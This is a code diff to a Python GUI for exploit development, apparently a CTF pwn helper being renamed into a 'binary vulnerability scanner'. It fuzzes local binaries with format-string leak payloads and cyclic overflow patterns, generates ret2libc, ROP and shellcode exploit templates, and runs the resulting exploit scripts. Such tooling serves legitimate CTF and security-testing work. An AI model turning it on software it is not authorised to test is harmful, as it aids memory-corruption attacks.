+                        leak_pattern = r'(0x[0-9a-fA-F]{8,16})'
+                        found_leaks = re.findall(leak_pattern, output)
+                        
+                        if found_leaks:
+                            # Take the last/most relevant leak
+                            leak_addr = found_leaks[-1]
+                            
+                            # Identify leak type
+                            leak_type = self._identify_leak_type(leak_addr)
+                            notes = self._get_leak_notes(leak_addr, leak_type)
+                            
+                            # Display in table format
+                            display_line = f"{i:<10} {leak_addr:<20} {leak_type:<15} {notes}\n"
+                            self.interactive_text.insert(tk.END, display_line)
+                            self.interactive_text.see(tk.END)
+                            
+                            leaks.append((i, leak_addr, leak_type))
+                    
+                    # Update UI every 10 iterations
+                    if i % 10 == 0:
+                        self.root.update()
                 
-                # Payload: %i$p
-                payload = f"%{i}$p".encode()
-                
-                # Replay history
-                full_input = b""
-                for step in history:
-                    full_input += step['input'].encode() + b"\n"
-                
-                full_input += payload + b"\n"
-                
-                # Run
-                exit_code, output, error = runner.run_with_input(full_input)
-                
-                # Parse output (Crude heuristic: look for last non-empty line)
-                if output:
-                    lines = [l.strip() for l in output.decode(errors='ignore').split('\n') if l.strip()]
-                    if lines:
-                        # Assumption: The flag/leak is in the response to our payload
-                        # We might need to filter out the menu text
-                        potential_leak = lines[-1]
-                        if potential_leak.startswith('0x') or len(potential_leak) > 4:
-                             self.log(f"Offset {i}: {potential_leak}")
-                             leaks.append((i, potential_leak))
+                except Exception as e:
+                    # Continue even if one iteration fails
+                    continue
+            
+            # Summary
+            self.interactive_text.insert(tk.END, "="*70 + "\n")
+            self.interactive_text.insert(tk.END, f"✅ Format String Fuzzing Complete\n")
+            self.interactive_text.insert(tk.END, f"📊 Found {len(leaks)} leaked address(es) across {len(leaks)} offsets\n")
+            self.interactive_text.insert(tk.END, "="*70 + "\n\n")
+            self.interactive_text.see(tk.END)
             
             self.log(f"Format String Fuzzing Complete. Found {len(leaks)} potential leaks.")
             if leaks:
-                 messagebox.showinfo("Fuzzing Result", f"Found {len(leaks)} leaks.\nCheck logs for details.")
+                messagebox.showinfo("Fuzzing Result", f"Found {len(leaks)} leaks!\nCheck Interactive tab for details.")
 
         except Exception as e:
             self.log(f"Fuzzing error: {str(e)}")
+            import traceback
+            traceback.print_exc()
         finally:
             self.root.after(0, lambda: self.update_status("Ready", False))
 
@@ -3340,7 +3497,7 @@ class CTFPwnToolGUI:
                 
                 # We can't easy get the fault address without a core dump or GDB in this simple runner.
                 # However, the user asked to "find the bufferoverflow" based on segfault.
-                # In a real CTF scenario, we'd inspect the core dump.
+                # In a real-world scenario, we'd inspect the core dump.
                 # Here, we will assume generic offset detection or just report the crash.
                 
                 # If we had the fault address (e.g. from dmesg or if the tool supports it), we would do:
@@ -3406,6 +3563,9 @@ class CTFPwnToolGUI:
     def generate_exploit(self):
         exploit_type = self.exploit_type.get()
         
+        # Get binary path, fallback to './target' if not loaded
+        binary_path = self.binary_path if self.binary_path else './target'
+        
         arch = 'x64'
         if self.analyzer and self.analyzer.info:
             arch_info = self.analyzer.info.get('architecture', {})
@@ -3414,23 +3574,23 @@ class CTFPwnToolGUI:
                 arch = 'x64'
         
         if exploit_type == "buffer_overflow":
-            exploit = ExploitGenerator.generate_buffer_overflow(112, arch)
+            exploit = ExploitGenerator.generate_buffer_overflow(112, arch, binary_path)
         elif exploit_type == "format_string":
-            exploit = ExploitGenerator.generate_format_string(6)
+            exploit = ExploitGenerator.generate_format_string(6, binary_path)
         elif exploit_type == "rop":
-            exploit = ExploitGenerator.generate_rop_chain(arch)
+            exploit = ExploitGenerator.generate_rop_chain(arch, binary_path)
         elif exploit_type == "ret2win":
-            exploit = ExploitGenerator.generate_ret2win(112, "0x401135")
+            exploit = ExploitGenerator.generate_ret2win(112, "0x401135", binary_path)
         elif exploit_type == "ret2libc":
-            exploit = ExploitGenerator.generate_ret2libc(112, "0xbeef", "0xdead", "0x401100")
+            exploit = ExploitGenerator.generate_ret2libc(112, "0xbeef", "0xdead", "0x401100", binary_path)
         elif exploit_type == "ret2plt":
-            exploit = ExploitGenerator.generate_ret2plt(112, "0x401200")
+            exploit = ExploitGenerator.generate_ret2plt(112, "0x401200", binary_path)
         elif exploit_type == "srop":
-            exploit = ExploitGenerator.generate_srop(112, "0x401000")
+            exploit = ExploitGenerator.generate_srop(112, "0x401000", binary_path)
         elif exploit_type == "shellcode":
-            exploit = ExploitGenerator.generate_shellcode_injection(112, arch)
+            exploit = ExploitGenerator.generate_shellcode_injection(112, arch, binary_path)
         elif exploit_type == "ret2csu":
-            exploit = ExploitGenerator.generate_ret2csu(112, arch)
+            exploit = ExploitGenerator.generate_ret2csu(112, arch, binary_path)
         elif exploit_type == "command_injection":
             exploit = """#!/usr/bin/env python3
 print("Command injection exploit code")
@@ -3442,6 +3602,122 @@ print("Needs modification based on actual situation")"""
         self.exploit_editor.insert(tk.END, exploit)
         
         self.log(f"Generated {exploit_type} exploit code")
+    def run_exploit(self):
+        """Execute the exploit script from the editor."""
+        if self.exploit_running:
+            messagebox.showwarning("Warning", "Exploit is already running!")
+            return
+        
+        exploit_code = self.exploit_editor.get(1.0, tk.END).strip()
+        if not exploit_code:
+            messagebox.showwarning("Warning", "Exploit editor is empty! Generate or write an exploit first.")
+            return
+        
+        # Update UI state
+        self.run_exploit_btn.config(state='disabled')
+        self.stop_exploit_btn.config(state='normal')
+        self.exploit_status_label.config(text="Running...", fg='#2ecc71')
+        self.exploit_running = True
+        
+        # Clear previous output
+        self.exploit_output.config(state='normal')
+        self.exploit_output.delete(1.0, tk.END)
+        self.exploit_output.insert(tk.END, "[*] Starting exploit...\\n")
+        self.exploit_output.config(state='disabled')
+        
+        # Start execution thread
+        threading.Thread(target=self._run_exploit_thread, args=(exploit_code,), daemon=True).start()
+    
+    def _run_exploit_thread(self, exploit_code):
+        """Background thread to run the exploit."""
+        try:
+            # Save exploit to temp file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+                temp_file = f.name
+                f.write(exploit_code)
+            
+            self.root.after(0, self._append_exploit_output, f"[*] Exploit saved to {temp_file}\\n")
+            
+            # Prepare command
+            cmd = ["python3", temp_file]
+            
+            # Add arguments if specified
+            args = self.exploit_args.get().strip()
+            if args:
+                cmd.extend(args.split())
+            
+            self.root.after(0, self._append_exploit_output, f"[*] Running: {' '.join(cmd)}\\n")
+            
+            # Execute
+            self.exploit_process = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+                bufsize=1
+            )
+            
+            # Read output line by line
+            for line in iter(self.exploit_process.stdout.readline, ''):
+                if not self.exploit_running:
+                    break
+                self.root.after(0, self._append_exploit_output, line)
+            
+            # Wait for completion
+            return_code = self.exploit_process.wait()
+            
+            # Report completion
+            if return_code == 0:
+                self.root.after(0, self._append_exploit_output, "\\n[+] Exploit completed successfully!\\n")
+                self.root.after(0, self.exploit_status_label.config, {'text': 'Completed', 'fg': '#2ecc71'})
+            else:
+                self.root.after(0, self._append_exploit_output, f"\\n[-] Exploit exited with code {return_code}\\n")
+                self.root.after(0, self.exploit_status_label.config, {'text': 'Failed', 'fg': '#e74c3c'})
+            
+            # Cleanup
+            try:
+                os.unlink(temp_file)
+            except:
+                pass
+                
+        except Exception as e:
+            self.root.after(0, self._append_exploit_output, f"\\n[!] Error: {str(e)}\\n")
+            self.root.after(0, self.exploit_status_label.config, {'text': 'Error', 'fg': '#e74c3c'})
+            traceback.print_exc()
+        
+        finally:
+            self.exploit_running = False
+            self.exploit_process = None
+            self.root.after(0, self.run_exploit_btn.config, {'state': 'normal'})
+            self.root.after(0, self.stop_exploit_btn.config, {'state': 'disabled'})
+    
+    def stop_exploit(self):
+        """Stop the currently running exploit."""
+        if self.exploit_process:
+            self.exploit_running = False
+            try:
+                self.exploit_process.terminate()
+                self.exploit_process.wait(timeout=2)
+            except:
+                self.exploit_process.kill()
+            
+            self._append_exploit_output("\\n[!] Exploit stopped by user\\n")
+            self.exploit_status_label.config(text="Stopped", fg='#e67e22')
+            self.run_exploit_btn.config(state='normal')
+            self.stop_exploit_btn.config(state='disabled')
+    
+    def clear_exploit_output(self):
+        """Clear the exploit output console."""
+        self.exploit_output.config(state='normal')
+        self.exploit_output.delete(1.0, tk.END)
+        self.exploit_output.config(state='disabled')
+    
+    def _append_exploit_output(self, text):
+        """Append text to exploit output console (GUI thread safe)."""
+        self.exploit_output.config(state='normal')
+        self.exploit_output.insert(tk.END, text)
+        self.exploit_output.see(tk.END)
+        self.exploit_output.config(state='disabled')
     
     def show_statistics(self):
         if not self.current_results:
@@ -3561,125 +3837,195 @@ print("Needs modification based on actual situation")"""
         # Ask user for fuzzing type
         fuzz_type_dialog = tk.Toplevel(self.root)
         fuzz_type_dialog.title("Select Fuzzing Type")
-        fuzz_type_dialog.geometry("300x150")
+        fuzz_type_dialog.geometry("300x200")
         
         tk.Label(fuzz_type_dialog, text="Choose fuzzing strategy:", pady=10).pack()
         
+        offset_frame = tk.Frame(fuzz_type_dialog)
+        offset_frame.pack(pady=2)
+        tk.Label(offset_frame, text="Max Offset:").pack(side=tk.LEFT)
+        max_offset_var = tk.IntVar(value=60)
+        tk.Spinbox(offset_frame, from_=5, to=500, textvariable=max_offset_var, width=5).pack(side=tk.LEFT)
+
         def run_format_fuzz():
+            max_offset = max_offset_var.get()
             fuzz_type_dialog.destroy()
-            threading.Thread(target=self._fuzz_format_string, args=(history,), daemon=True).start()
+            threading.Thread(target=self._fuzz_format_string, args=(history, max_offset), daemon=True).start()
             
         def run_bof_fuzz():
             fuzz_type_dialog.destroy()
             threading.Thread(target=self._fuzz_buffer_overflow, args=(history,), daemon=True).start()
 
-        tk.Button(fuzz_type_dialog, text="Format String (Leaks 1-55)", command=run_format_fuzz, width=25, bg='#3498db', fg='white').pack(pady=5)
+        tk.Button(fuzz_type_dialog, text="Format String (Custom Range)", command=run_format_fuzz, width=25, bg='#3498db', fg='white').pack(pady=5)
         tk.Button(fuzz_type_dialog, text="Buffer Overflow (Cyclic)", command=run_bof_fuzz, width=25, bg='#e74c3c', fg='white').pack(pady=5)
 
-    def _fuzz_format_string(self, history):
-        self.update_status("Fuzzing Format String...", True)
-        self.log("Starting Format String Fuzzing (Offsets 1-55)...")
-        # Ensure we don't print "Starting..." multiple times if not needed, as per screenshot
+    def _classify_leak(self, val_str: str) -> str:
+        """Classifies a leaked address."""
+        if val_str == "(nil)":
+            return "NULL"
         
         try:
-            for i in range(1, 56):
-                runner = BinaryRunner(self.binary_path)
-                
-                # Payload: %i$p to leak sensitive data
-                payload = f"%{i}$p".encode()
+            val = int(val_str, 16)
+            
+            # Heuristics for x64
+            if 0x7f0000000000 <= val <= 0x7fffffffffff:
+                return "Stack/Libc leak"
+            elif 0x550000000000 <= val <= 0x56ffffffffff:
+                return "PIE/Heap leak"
+            elif 0x400000 <= val <= 0x409fff:
+                return "Binary leak (No PIE)"
+            elif val < 0x1000:
+                return "Small Integer"
+            else:
+                return "Unknown"
+        except:
+            return "Raw String"
+
+    def _fuzz_format_string(self, history, max_offset=60):
+        self.update_status(f"Fuzzing Format String (1-{max_offset})...", True)
+        self.log(f"Starting Format String Fuzzing (Offsets 1-{max_offset}) using Pwntools...")
+        
+        # Check for pwntools
+        if 'pwn' not in sys.modules:
+            self.log("Error: pwntools not installed. Please install it with 'pip install pwntools'")
+            messagebox.showerror("Error", "Pwntools not found. Please install it.")
+            self.update_status("Ready", False)
+            return
+
+        leaks_found = False
+        self.interactive_text.insert(tk.END, "\n" + "="*40 + "\n")
+        self.interactive_text.insert(tk.END, f"[*] FORMAT STRING FUZZING RESULTS (1-{max_offset})\n")
+        self.interactive_text.insert(tk.END, "="*40 + "\n")
+        self.interactive_text.see(tk.END)
+
+        try:
+            for i in range(1, max_offset + 1):
+                # Use pwntools process
+                p = process(self.binary_path)
                 
                 # Replay history
-                full_input = b""
                 for step in history:
-                    full_input += step['input'].encode() + b"\n"
+                    p.sendline(step['input'].encode())
+                    try: p.recv(timeout=0.05) 
+                    except: pass
                 
-                full_input += payload + b"\n"
+                # Payload: AAAAAAAA.%i$p to detect our own input
+                payload = f"AAAAAAAA.%{i}$p"
+                p.sendline(payload.encode())
                 
-                # Run
-                # Fix: Use runner.run instead of run_with_input
-                result = runner.run(full_input)
+                # Check for our marker in memory
+                marker_64 = "0x4141414141414141"
+                marker_32 = "0x41414141"
                 
-                output_str = result.get('stdout', '') or ""
-                if not isinstance(output_str, str):
-                    output_str = output_str.decode(errors='ignore')
+                # Read output
+                try:
+                    output_data = p.clean(timeout=0.5)
+                    output_str = output_data.decode(errors='ignore')
+                except Exception as e:
+                    output_str = ""
+                
+                p.close()
 
-                # Parse output to find the leak
-                # Only show lines with actual leaks (skip nil values)
+                # Parse output
                 lines = [l.strip() for l in output_str.split('\n') if l.strip()]
                 
                 if lines:
-                    last_line = lines[-1]
-                    # Regex for 0x...
-                    hex_match = re.search(r'(0x[0-9a-fA-F]+)', last_line)
-                    if hex_match:
-                        val = hex_match.group(1)
-                        # Only print if we have a real leak (not nil)
-                        self.interactive_text.insert(tk.END, f"{i}: {val}\n")
-                        self.interactive_text.see(tk.END)
+                    for line in reversed(lines):
+                         match = re.search(r'(0x[0-9a-fA-F]+|\(nil\))', line)
+                         if match:
+                             val = match.group(1)
+                             leak_type = self._classify_leak(val)
+                             
+                             # Check for User Input Marker
+                             if val == marker_64 or val == marker_32:
+                                 leak_type = "** USER INPUT DETECTED **"
+                             
+                             # Structured Clean Output
+                             output_line = f"Offset {i:<2} → {leak_type:<25} → {val}\n"
+                             self.interactive_text.insert(tk.END, output_line)
+                             self.interactive_text.see(tk.END)
+                             leaks_found = True
+                             break
                 
-                # Small delay to keep UI responsive
                 self.root.update()
             
+            if not leaks_found:
+                self.interactive_text.insert(tk.END, "[-] No format string leaks detected.\n")
+            
+            self.interactive_text.insert(tk.END, "-"*40 + "\n\n")
+
         except Exception as e:
             self.log(f"Fuzzing error: {str(e)}")
             self.interactive_text.insert(tk.END, f"[!] Error: {str(e)}\n")
+            traceback.print_exc()
         finally:
             self.root.after(0, lambda: self.update_status("Ready", False))
 
     def _fuzz_buffer_overflow(self, history):
-        self.update_status("Fuzzing Buffer Overflow...", True)
-        self.log("Starting Cyclic Buffer Overflow Fuzzing...")
-        self.interactive_text.insert(tk.END, "\n[*] Sending Cyclic Pattern (4096 bytes)...\n")
+        self.update_status("Fuzzing Buffer Overflow (Pwntools)...", True)
+        self.log("Starting Cyclic Buffer Overflow Fuzzing using Pwntools...")
         
+        # Check for pwntools
+        if 'pwn' not in sys.modules:
+             messagebox.showerror("Error", "Pwntools not found. Please install it.")
+             return
+
         try:
-            test_length = 4096 
-            pattern = cyclic(test_length)
+            # Test sizes similar to CLI
+            test_sizes = [64, 128, 256, 512, 1024, 2048, 4096]
+            crash_detected = False
             
-            runner = BinaryRunner(self.binary_path)
-            
-            full_input = b""
-            for step in history:
-                full_input += step['input'].encode() + b"\n"
-            
-            full_input += pattern + b"\n"
-            
-            # Fix: Use runner.run instead of run_with_input
-            result = runner.run(full_input)
-            
-            exit_code = result.get('returncode', 0)
-            
-            if exit_code < 0: # Signal (crash)
-                sig = -exit_code
-                self.interactive_text.insert(tk.END, f"[!] CRASH DETECTED! Signal: {sig}\n")
-                self.interactive_text.insert(tk.END, "[*] The application crashed with the cyclic pattern.\n")
-                self.interactive_text.insert(tk.END, "[*] Generating detailed exploit template...\n")
-                
-                messagebox.showinfo("Crash Found", f"Process crashed with signal {sig}!\nCheck Exploit tab.")
-                
-                exploit = ExploitGenerator.generate_dynamic_exploit(
-                    history, 
-f'''# Crash detected with 4096 bytes cyclic pattern
-# To find the exact offset:
-# 1. Run this script in GDB: gdb.attach(p)
-# 2. Let it crash
-# 3. Read fault address (e.g. 0x6161616c)
-# 4. offset = cyclic_find(0x6161616c)
+            for size in test_sizes:
+                self.interactive_text.insert(tk.END, f"[*] Sending Cyclic Pattern ({size} bytes)...\n")
+                self.interactive_text.see(tk.END)
+                self.root.update()
 
-payload = cyclic(4096)
-p.sendline(payload)
-p.interactive()
-''',
-                    initial_output=self.interactive_session.initial_output
-                )
-                self.root.after(0, lambda: self.exploit_editor.delete(1.0, tk.END))
-                self.root.after(0, lambda: self.exploit_editor.insert(tk.END, exploit))
-                self.root.after(0, lambda: self.notebook.select(self.notebook.index('end')-3))
-
-            else:
-                 self.interactive_text.insert(tk.END, "[-] No crash detected with 4096 bytes.\n")
+                # Use pwntools process
+                p = process(self.binary_path)
+                
+                # Replay history
+                for step in history:
+                    p.sendline(step['input'].encode())
+                    try: p.recv(timeout=0.05)
+                    except: pass
+                
+                # Send Payload
+                pattern = cyclic(size)
+                p.sendline(pattern)
+                
+                # Wait for response or crash
+                try:
+                    p.recvall(timeout=0.5)
+                except:
+                    pass
+                
+                # Check exit code
+                exit_code = p.poll()
+                
+                if exit_code and exit_code < 0: # Signal (crash)
+                    sig = -exit_code
+                    if sig == signal.SIGSEGV:
+                        self.interactive_text.insert(tk.END, "\n" + "-"*40 + "\n")
+                        self.interactive_text.insert(tk.END, "[BUFFER OVERFLOW RESULTS]\n")
+                        self.interactive_text.insert(tk.END, "Crash detected ✔\n")
+                        self.interactive_text.insert(tk.END, f"Signal: {sig} (SIGSEGV)\n")
+                        self.interactive_text.insert(tk.END, "-"*40 + "\n\n")
+                        
+                        messagebox.showinfo("Crash Found", f"Process crashed with signal {sig}!\nSize: {size}")
+                        crash_detected = True
+                        break
+                
+                p.close()
+            
+            if not crash_detected:
+                 self.interactive_text.insert(tk.END, "\n" + "-"*40 + "\n")
+                 self.interactive_text.insert(tk.END, f"No overflow detected up to {test_sizes[-1]} bytes\n")
+                 self.interactive_text.insert(tk.END, "-"*40 + "\n\n")
 
         except Exception as e:
             self.log(f"Fuzzing error: {str(e)}")
+            self.interactive_text.insert(tk.END, f"[!] Error: {str(e)}\n")
+            traceback.print_exc()
         finally:
             self.root.after(0, lambda: self.update_status("Ready", False))
 
@@ -3703,7 +4049,7 @@ def main():
     except:
         pass
     
-    app = CTFPwnToolGUI(root)
+    app = BinaryVulnScannerGUI(root)
     root.mainloop()
 
 if __name__ == "__main__":
